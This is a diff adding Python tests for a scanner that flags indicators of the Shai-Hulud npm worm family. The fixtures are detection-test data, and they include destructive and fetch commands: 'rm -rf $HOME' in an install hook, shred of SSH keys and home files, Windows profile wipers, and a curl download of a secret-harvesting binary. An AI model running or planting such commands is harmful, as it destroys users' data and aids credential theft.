@@ -384,3 +384,447 @@ class TestKnownSafeHooks:
         findings = scanner.scan_package_json(str(pkg), "package.json")
         hook_findings = [f for f in findings if "postinstall" in f.snippet]
         assert any(f.severity == "critical" for f in hook_findings)
+
+
+class TestSecondComingIndicators:
+    """scan_second_coming_indicators() — behavioral signatures for the
+    "Shai-Hulud: The Second Coming" fake-Bun wave and its Golden Path rename.
+
+    All fixtures are inert pattern strings; none contain working payload logic.
+    """
+
+    def test_fake_bun_preinstall_hook(self, tmp_path):
+        """`"preinstall": "node setup_bun.js"` is the dropper hook."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "t",
+            "scripts": {"preinstall": "node setup_bun.js"}
+        }))
+        findings = scanner.scan_second_coming_indicators(str(pkg), "package.json")
+        assert any(
+            f.severity == "critical"
+            and f.category == "install-script-ioc"
+            and "preinstall" in f.title.lower()
+            for f in findings
+        ), f"Got: {[(f.title, f.category) for f in findings]}"
+
+    def test_dropper_filename_reference(self, tmp_path):
+        """A bare reference to bun_environment.js is enough to flag."""
+        js = tmp_path / "index.js"
+        js.write_text('const p = "./bun_environment.js";\n')
+        findings = scanner.scan_second_coming_indicators(str(js), "index.js")
+        assert any(
+            f.category == "install-script-ioc" and "bun_environment" in f.title
+            for f in findings
+        )
+
+    def test_actions_secrets_reference(self, tmp_path):
+        wf = tmp_path / "ci.yml"
+        wf.write_text("jobs:\n  x:\n    steps:\n      - run: cat actionsSecrets.json\n")
+        findings = scanner.scan_second_coming_indicators(str(wf), "ci.yml")
+        assert any("actionsSecrets.json" in f.title for f in findings)
+
+    def test_second_coming_repo_marker(self, tmp_path):
+        """The GitHub dead-drop repository description marker."""
+        js = tmp_path / "drop.js"
+        js.write_text('const desc = "Sha1-Hulud: The Second Coming";\n')
+        findings = scanner.scan_second_coming_indicators(str(js), "drop.js")
+        assert any(
+            f.severity == "critical" and "dead-drop" in f.title.lower()
+            for f in findings
+        ), f"Got: {[f.title for f in findings]}"
+
+    def test_sha1hulud_runner_marker(self, tmp_path):
+        wf = tmp_path / "runner.yml"
+        wf.write_text("runs-on: SHA1HULUD\n")
+        findings = scanner.scan_second_coming_indicators(str(wf), "runner.yml")
+        assert any("SHA1HULUD" in f.title for f in findings)
+
+    def test_trufflehog_download_and_exec(self, tmp_path):
+        """Downloading the TruffleHog binary at install time is the harvest stage."""
+        sh = tmp_path / "install.sh"
+        sh.write_text("#!/bin/sh\ncurl -sL https://example.invalid/trufflehog -o /tmp/th\n")
+        findings = scanner.scan_second_coming_indicators(str(sh), "install.sh")
+        assert any(
+            f.severity == "critical"
+            and f.category == "install-script-ioc"
+            and "TruffleHog" in f.title
+            for f in findings
+        ), f"Got: {[f.title for f in findings]}"
+
+    def test_deadman_rm_rf_home_in_postinstall(self, tmp_path):
+        """`rm -rf $HOME` in a lifecycle hook is the dead-man's switch."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "t",
+            "scripts": {"postinstall": "rm -rf $HOME"}
+        }))
+        findings = scanner.scan_second_coming_indicators(str(pkg), "package.json")
+        deadman = [f for f in findings if f.category == "destructive-fallback"]
+        assert len(deadman) >= 1, f"Got: {[(f.title, f.category) for f in findings]}"
+        assert all(f.severity == "critical" for f in deadman)
+        assert any("home directory" in f.title.lower() for f in deadman)
+
+    def test_deadman_homedir_plus_recursive_rmsync_combo(self, tmp_path):
+        """JS form: os.homedir() resolved in the same file as a recursive rmSync."""
+        js = tmp_path / "cleanup.js"
+        js.write_text(
+            "const os = require('os');\n"
+            "const home = os.homedir();\n"
+            "fs.rmSync(home, { recursive: true, force: true });\n"
+        )
+        findings = scanner.scan_second_coming_indicators(str(js), "cleanup.js")
+        combo = [
+            f for f in findings
+            if f.category == "destructive-fallback"
+            and "Recursively Deleted" in f.title
+        ]
+        assert len(combo) == 1, f"Got: {[(f.title, f.category) for f in findings]}"
+        assert combo[0].severity == "critical"
+        assert combo[0].line == 3
+
+    def test_homedir_alone_not_flagged(self, tmp_path):
+        """Precision: resolving the home directory without a recursive delete
+        is ordinary code and must not fire."""
+        js = tmp_path / "config.js"
+        js.write_text(
+            "const os = require('os');\n"
+            "module.exports = { cache: os.homedir() + '/.cache' };\n"
+        )
+        findings = scanner.scan_second_coming_indicators(str(js), "config.js")
+        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"
+
+    def test_recursive_delete_alone_not_flagged(self, tmp_path):
+        """Precision: a recursive delete of a build dir is ordinary tooling."""
+        js = tmp_path / "clean.js"
+        js.write_text("fs.rmSync('dist', { recursive: true, force: true });\n")
+        findings = scanner.scan_second_coming_indicators(str(js), "clean.js")
+        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"
+
+    def test_benign_package_json_no_findings(self, tmp_path):
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "t",
+            "scripts": {"build": "tsc", "postinstall": "husky install"}
+        }))
+        findings = scanner.scan_second_coming_indicators(str(pkg), "package.json")
+        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"
+
+    def test_unreadable_file_does_not_raise(self, tmp_path):
+        """Missing file is skipped, not fatal (fail-soft contract)."""
+        findings = scanner.scan_second_coming_indicators(
+            str(tmp_path / "nope.js"), "nope.js"
+        )
+        assert findings == []
+
+
+class TestGoldenPathIndicators:
+    """New SECOND_COMING_PATTERNS entries for the December 2025 "Golden Path"
+    variant, consumed by the existing scan_second_coming_indicators().
+
+    Source: Cobenian/shai-hulud-detect CHANGELOG 3.1.0 -- "Detection for
+    obfuscated exfiltration JSON files: `3nvir0nm3nt.json`, `cl0vd.json`,
+    `c9nt3nts.json`, `pigS3cr3ts.json`" -- and check_new_workflow_patterns()
+    -- "Look for formatter_123456789.yml workflow files".
+    """
+
+    def test_obfuscated_exfil_json_reference(self, tmp_path):
+        js = tmp_path / "drop.js"
+        js.write_text('fs.writeFileSync("3nvir0nm3nt.json", blob);\n')
+        findings = scanner.scan_second_coming_indicators(str(js), "drop.js")
+        assert any(
+            f.severity == "critical"
+            and f.category == "install-script-ioc"
+            and "3nvir0nm3nt.json" in f.title
+            for f in findings
+        ), f"Got: {[f.title for f in findings]}"
+
+    def test_all_four_golden_path_names_match(self, tmp_path):
+        for name in ("3nvir0nm3nt.json", "cl0vd.json", "c9nt3nts.json", "pigS3cr3ts.json"):
+            js = tmp_path / "d.js"
+            js.write_text(f'const out = "{name}";\n')
+            findings = scanner.scan_second_coming_indicators(str(js), "d.js")
+            assert findings, f"{name} did not match"
+
+    def test_benign_json_names_not_flagged(self, tmp_path):
+        """Precision: real-word neighbours of the leetspeak names must not fire."""
+        js = tmp_path / "d.js"
+        js.write_text(
+            'const a = "environment.json";\n'
+            'const b = "cloud.json";\n'
+            'const c = "contents.json";\n'
+            'const d = "secrets.json";\n'
+        )
+        findings = scanner.scan_second_coming_indicators(str(js), "d.js")
+        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"
+
+    def test_formatter_workflow_filename(self, tmp_path):
+        wf = tmp_path / "ci.yml"
+        wf.write_text("run: cp payload .github/workflows/formatter_123456789.yml\n")
+        findings = scanner.scan_second_coming_indicators(str(wf), "ci.yml")
+        assert any("formatter_" in f.title for f in findings), \
+            f"Got: {[f.title for f in findings]}"
+
+    def test_ordinary_formatter_workflow_not_flagged(self, tmp_path):
+        """Precision: the pattern requires the attacker's numeric suffix."""
+        wf = tmp_path / "ci.yml"
+        wf.write_text("uses: ./.github/workflows/formatter_check.yml\n")
+        findings = scanner.scan_second_coming_indicators(str(wf), "ci.yml")
+        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"
+
+
+class TestShaiHuludFamilyIndicators:
+    """scan_shai_hulud_family_indicators() -- family coverage outside the
+    Second Coming wave: dead-drop repo markers, Mini Shai-Hulud droppers,
+    wipe-threat token strings, dead-man's-switch daemons, and secure-erase
+    wiper stages.
+
+    Every fixture string is an inert IOC literal quoted from the reference
+    detector; none contains working payload logic.
+    """
+
+    # --- Behaviour class 3: GitHub repo-description / beacon markers ---
+
+    def test_mini_shai_hulud_appeared_marker(self, tmp_path):
+        js = tmp_path / "exfil.js"
+        js.write_text('desc: "A Mini Shai-Hulud has Appeared",\n')
+        findings = scanner.scan_shai_hulud_family_indicators(str(js), "exfil.js")
+        assert any(
+            f.severity == "critical"
+            and f.category == "install-script-ioc"
+            and "Dead-Drop Marker" in f.title
+            for f in findings
+        ), f"Got: {[(f.title, f.category) for f in findings]}"
+
+    def test_reversed_here_we_go_again_beacon(self, tmp_path):
+        """May 2026 AntV/atool wave stamps the marker character-reversed."""
+        js = tmp_path / "exfil.js"
+        js.write_text('const b = "niagA oG eW ereH :duluH-iahS";\n')
+        findings = scanner.scan_shai_hulud_family_indicators(str(js), "exfil.js")
+        assert any("reversed" in f.title for f in findings), \
+            f"Got: {[f.title for f in findings]}"
+
+    def test_forward_here_we_go_again_marker(self, tmp_path):
+        js = tmp_path / "exfil.js"
+        js.write_text('description = "Shai-Hulud: Here We Go Again"\n')
+        findings = scanner.scan_shai_hulud_family_indicators(str(js), "exfil.js")
+        assert any("Here We Go Again" in f.title for f in findings)
+
+    def test_goldox_golden_path_marker(self, tmp_path):
+        js = tmp_path / "exfil.js"
+        js.write_text('d = "Goldox-T3chs: Only Happy Girl"\n')
+        findings = scanner.scan_shai_hulud_family_indicators(str(js), "exfil.js")
+        assert any("Golden Path" in f.title for f in findings)
+
+    def test_hades_and_miasma_hyphen_markers(self, tmp_path):
+        js = tmp_path / "exfil.js"
+        js.write_text(
+            'a = "Hades - The End for the Damned";\n'
+            'b = "Miasma - The Spreading Blight";\n'
+        )
+        findings = scanner.scan_shai_hulud_family_indicators(str(js), "exfil.js")
+        titles = " ".join(f.title for f in findings)
+        assert "Hades" in titles and "Miasma" in titles, f"Got: {titles}"
+
+    def test_attacker_exfil_repo_names(self, tmp_path):
+        js = tmp_path / "exfil.js"
+        js.write_text('repo = "siridar-ghola-567"\n')
+        findings = scanner.scan_shai_hulud_family_indicators(str(js), "exfil.js")
+        assert any("exfil repository name" in f.title for f in findings)
+
+    def test_generic_shai_hulud_prose_not_flagged(self, tmp_path):
+        """Precision: writing *about* the worm is not being the worm."""
+        md = tmp_path / "notes.js"
+        md.write_text(
+            '// See the Shai-Hulud advisory before upgrading.\n'
+            '// Shai-Hulud detection is handled upstream.\n'
+        )
+        findings = scanner.scan_shai_hulud_family_indicators(str(md), "notes.js")
+        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"
+
+    # --- Behaviour class 1: Mini Shai-Hulud dropper filenames / delivery ---
+
+    def test_router_init_payload_filename(self, tmp_path):
+        js = tmp_path / "index.js"
+        js.write_text('require("./router_init.js");\n')
+        findings = scanner.scan_shai_hulud_family_indicators(str(js), "index.js")
+        assert any(
+            f.category == "install-script-ioc" and "router_init.js" in f.title
+            for f in findings
+        ), f"Got: {[f.title for f in findings]}"
+
+    def test_bun_run_index_preinstall_hook(self, tmp_path):
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "t", "scripts": {"preinstall": "bun run index.js"}
+        }))
+        findings = scanner.scan_shai_hulud_family_indicators(str(pkg), "package.json")
+        assert any("Bun dropper hook" in f.title for f in findings), \
+            f"Got: {[f.title for f in findings]}"
+
+    def test_orphan_commit_optional_dependency(self, tmp_path):
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "t",
+            "optionalDependencies": {"g2": "github:antvis/G2#1916faa365f2788b6e193514872d51a242876569"}
+        }))
+        findings = scanner.scan_shai_hulud_family_indicators(str(pkg), "package.json")
+        assert any("orphan-commit ref" in f.title for f in findings)
+
+    def test_fake_tanstack_setup_package(self, tmp_path):
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({"name": "t", "dependencies": {"@tanstack/setup": "1.0.0"}}))
+        findings = scanner.scan_shai_hulud_family_indicators(str(pkg), "package.json")
+        assert any("@tanstack/setup" in f.title for f in findings)
+
+    def test_real_tanstack_packages_not_flagged(self, tmp_path):
+        """Precision: the genuine @tanstack namespace must stay clean."""
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "t",
+            "dependencies": {
+                "@tanstack/react-router": "1.169.6",
+                "@tanstack/react-query": "5.0.0",
+            },
+            "scripts": {"preinstall": "bun run build"},
+        }))
+        findings = scanner.scan_shai_hulud_family_indicators(str(pkg), "package.json")
+        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"
+
+    def test_router_initializer_not_flagged(self, tmp_path):
+        """Precision: router_initializer.js is a near-miss on router_init.js."""
+        js = tmp_path / "index.js"
+        js.write_text('require("./router_initializer.js");\n')
+        findings = scanner.scan_shai_hulud_family_indicators(str(js), "index.js")
+        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"
+
+    # --- Behaviour class 4: wipe threats, deadman daemons, wiper stages ---
+
+    def test_wipe_threat_token_description(self, tmp_path):
+        js = tmp_path / "token.js"
+        js.write_text('note: "IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner"\n')
+        findings = scanner.scan_shai_hulud_family_indicators(str(js), "token.js")
+        assert any(
+            f.severity == "critical"
+            and f.category == "destructive-fallback"
+            and "wipe-threat token" in f.title
+            for f in findings
+        ), f"Got: {[(f.title, f.category) for f in findings]}"
+
+    def test_wipe_threat_variants_all_match(self, tmp_path):
+        for marker in (
+            "IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner",
+            "IfYouYankThisTokenItWillNukeTheComputerOfTheOwnerFully",
+            "RevokeAndItGoesKaboom",
+        ):
+            js = tmp_path / "t.js"
+            js.write_text(f'const m = "{marker}";\n')
+            findings = scanner.scan_shai_hulud_family_indicators(str(js), "t.js")
+            assert findings, f"{marker} did not match"
+
+    def test_revoke_prose_not_flagged(self, tmp_path):
+        """Precision: ordinary wording about revoking a token must not fire."""
+        js = tmp_path / "t.js"
+        js.write_text('// If you revoke this token it will stop working.\n')
+        findings = scanner.scan_shai_hulud_family_indicators(str(js), "t.js")
+        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"
+
+    def test_deadman_daemon_script_reference(self, tmp_path):
+        sh = tmp_path / "install.sh"
+        sh.write_text("cp monitor $HOME/.local/bin/gh-token-monitor.sh\n")
+        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "install.sh")
+        assert any(
+            f.category == "destructive-fallback" and "gh-token-monitor" in f.title
+            for f in findings
+        ), f"Got: {[(f.title, f.category) for f in findings]}"
+
+    def test_deadman_launchagent_plist_reference(self, tmp_path):
+        sh = tmp_path / "install.sh"
+        sh.write_text("launchctl load com.user.kitty-monitor.plist\n")
+        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "install.sh")
+        assert any("LaunchAgent" in f.title for f in findings)
+
+    def test_kitty_cat_payload_path(self, tmp_path):
+        sh = tmp_path / "install.sh"
+        sh.write_text("python3 $HOME/.local/share/kitty/cat.py &\n")
+        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "install.sh")
+        assert any("cat.py" in f.title for f in findings)
+
+    def test_ordinary_monitor_script_not_flagged(self, tmp_path):
+        """Precision: a generic monitor.sh is not the dead-man's switch."""
+        sh = tmp_path / "install.sh"
+        sh.write_text("cp monitor.sh /usr/local/bin/monitor.sh\n")
+        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "install.sh")
+        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"
+
+    def test_shred_home_directory(self, tmp_path):
+        sh = tmp_path / "wipe.sh"
+        sh.write_text("shred -uvz $HOME/.ssh/id_rsa\n")
+        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "wipe.sh")
+        assert any(
+            f.severity == "critical"
+            and f.category == "destructive-fallback"
+            and "shred" in f.title.lower()
+            for f in findings
+        ), f"Got: {[(f.title, f.category) for f in findings]}"
+
+    def test_find_home_xargs_shred(self, tmp_path):
+        sh = tmp_path / "wipe.sh"
+        sh.write_text("find $HOME -type f -writable | xargs shred -u\n")
+        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "wipe.sh")
+        wiper = [f for f in findings if f.category == "destructive-fallback"]
+        assert len(wiper) == 1, f"Got: {[f.title for f in findings]}"
+
+    def test_windows_wiper_commands(self, tmp_path):
+        for cmd in (
+            "cipher /W:%USERPROFILE%",
+            "del /F /Q /S %USERPROFILE%\\*",
+            "rd /S /Q %USERPROFILE%",
+        ):
+            bat = tmp_path / "w.bat"
+            bat.write_text(cmd + "\n")
+            findings = scanner.scan_shai_hulud_family_indicators(str(bat), "w.bat")
+            assert findings, f"{cmd!r} did not match"
+            assert findings[0].category == "destructive-fallback"
+
+    def test_bun_spawnsync_wiper(self, tmp_path):
+        """Bun.spawnSync shelling out to a wiper. The fixture deliberately uses a
+        non-$HOME shred target so only the Bun.spawnSync rule can match (the
+        per-group break means the first matching wiper rule wins the line)."""
+        js = tmp_path / "payload.js"
+        js.write_text('Bun.spawnSync(["bash", "-c", "shred -u /tmp/x"]);\n')
+        findings = scanner.scan_shai_hulud_family_indicators(str(js), "payload.js")
+        assert any("Bun.spawnSync" in f.title for f in findings), \
+            f"Got: {[f.title for f in findings]}"
+
+    def test_shred_help_not_flagged(self, tmp_path):
+        """Precision: `shred --help` and a scoped cipher call must not fire."""
+        sh = tmp_path / "ok.sh"
+        sh.write_text("shred --help\ncipher /W:C:\\build\\tmp\n")
+        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "ok.sh")
+        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"
+
+    # --- Hygiene ---
+
+    def test_benign_package_json_no_findings(self, tmp_path):
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "t",
+            "scripts": {"build": "tsc", "postinstall": "husky install"},
+            "dependencies": {"express": "4.18.0"},
+        }))
+        findings = scanner.scan_shai_hulud_family_indicators(str(pkg), "package.json")
+        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"
+
+    def test_long_line_is_skipped(self, tmp_path):
+        """MAX_LINE_LENGTH guard: minified blobs are not regex-scanned."""
+        js = tmp_path / "min.js"
+        js.write_text("x" * (scanner.core.MAX_LINE_LENGTH + 10) + "router_init.js\n")
+        findings = scanner.scan_shai_hulud_family_indicators(str(js), "min.js")
+        assert findings == []
+
+    def test_unreadable_file_does_not_raise(self, tmp_path):
+        findings = scanner.scan_shai_hulud_family_indicators(
+            str(tmp_path / "nope.js"), "nope.js"
+        )
+        assert findings == []
